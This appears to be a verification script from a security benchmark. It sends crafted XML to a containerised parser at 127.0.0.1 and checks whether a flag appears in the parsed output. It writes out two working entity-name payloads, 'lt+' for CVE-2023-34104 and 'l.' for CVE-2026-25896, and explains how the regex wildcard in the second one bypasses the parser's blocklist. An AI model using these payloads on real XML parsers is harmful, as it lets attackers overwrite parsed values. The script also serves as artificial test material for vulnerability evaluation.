#!/usr/bin/env bash
# verify.sh --seed|--residual
# 0 = RUN_FLAG_REF appears in POST /parse JSON (entity VALUE overwrote &lt;)
# 10 = blocked / not observed; 20 = env; 30 = usage
#
# seed:     <!ENTITY lt+ "FLAG">   (CVE-2023-34104; + quantifier)
# residual: <!ENTITY l. "FLAG">    (CVE-2026-25896; '.' wildcard; inline, never seed fallback)
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
JUDGE="${RUN_FLAG_REF:-$RUN_FLAG}"
mkdir -p "$WORK_DIR"

if [[ -n "${WORK_DIR:-}" && -f "$WORK_DIR/compose.env" ]]; then
  set -a
  # shellcheck disable=SC1091
  source "$WORK_DIR/compose.env"
  set +a
fi

export PCB_FLAG="$RUN_FLAG"
export PYTHONPATH="$CASE_DIR${PYTHONPATH:+:$PYTHONPATH}"

SVC="$VERSION"
PORT=""
for _ in $(seq 1 30); do
  PORT="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" \
    port "$SVC" 80 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
  if [[ -z "$PORT" ]]; then
    CID="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" \
      ps -q "$SVC" 2>/dev/null | head -1)"
    if [[ -n "$CID" ]]; then
      PORT="$(docker port "$CID" 80 2>/dev/null | head -1 | sed 's/.*://' | tr -d '[:space:]')"
    fi
  fi
  if [[ -n "$PORT" ]]; then
    code="$(curl -sS -o /dev/null -w '%{http_code}' --max-time 5 -X POST \
      -H 'Content-Type: text/xml' --data '<r>ok</r>' \
      "http://127.0.0.1:${PORT}/parse" || true)"
    if [[ "$code" == "200" ]]; then
      break
    fi
  fi
  sleep 2
  PORT=""
done
if [[ -z "$PORT" ]]; then
  echo "verify: no mapped port /parse for $SVC:80" >&2
  exit 20
fi
export PCB_TARGET_PORT="$PORT"

if [[ "$MODE" == "--seed" ]]; then
  CAND="$("$PY" "$CASE_DIR/poc/original_poc.py" 2>/dev/null || true)"
  CAND="${CAND:-"{}"}"
  CAND="$("$PY" -c "
import json, re, sys
flag, s = sys.argv[1], sys.argv[2]
s = re.sub(r'PCBFLAG_[A-Za-z0-9_]+', flag, s)
try:
    json.loads(s)
    print(s)
except Exception:
    print(json.dumps({'payload': s.strip()}))
" "$RUN_FLAG" "$CAND")"
  printf '%s' "$CAND" > "$WORK_DIR/cand.json"
else
  # CVE-2026-25896: entity NAME l. (period = XML NameChar + regex wildcard).
  # V1 4.2.4 blocklist added '|' and '+' so seed lt+ throws; '.' is still allowed
  # and interpolates unescaped into RegExp(`&${entityName};`) -> /&l.;/ shadows &lt;.
  # Inline literal XML. Never original_poc, never heldout, never seed fallback.
  "$PY" - "$RUN_FLAG" <<'PY' > "$WORK_DIR/cand.json"
import json, sys
flag = sys.argv[1]
payload = (
    '<?xml version="1.0"?>\n'
    '<!DOCTYPE r [\n'
    '<!ENTITY l. "%s">\n'
    ']>\n'
    '<r>&lt;</r>' % flag
)
print(json.dumps({"id": "cve-2026-25896-entityname-l-dot", "payload": payload}))
PY
fi

OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
echo "${OUT:0:500}"
if grep -qF -- "$JUDGE" <<<"$OUT"; then exit 0; else exit 10; fi
